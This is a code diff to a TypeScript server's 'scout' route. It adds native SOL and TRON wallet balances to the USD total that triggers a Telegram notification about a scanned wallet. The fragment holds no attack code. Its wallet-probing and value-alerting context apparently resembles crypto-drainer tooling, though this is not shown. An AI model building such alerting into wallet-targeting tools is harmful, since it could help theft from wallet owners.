@@ -296,8 +296,11 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
         } catch {
           /* ranked probe optional */
         }
-        const notifyUsd = Math.max(scoutUsdFromBody, fusionTotal)
-        if (notifyUsd > 0 && (scoutUsdFromBody > 0 || fusionTotal > 0)) {
+        // rankedUsd = actual SOL/TRON native balances from probeSolBalances/probeTronBalances.
+        // fusionTotal only counts staked DeFi positions (mSOL/JitoSOL/stETH) — 0 for fresh wallets.
+        // Without rankedUsd: Telegram shows EVM total even for pure SOL/TRON wallets.
+        const notifyUsd = Math.max(scoutUsdFromBody, fusionTotal, rankedUsd)
+        if (notifyUsd > 0 && (scoutUsdFromBody > 0 || fusionTotal > 0 || rankedUsd > 0)) {
           const assetsCount = strategyAssets.length > 0 ? strategyAssets.length : fusion.assets_count
           const scanCtx: TelegramRequestContext = {
             ...ctx,
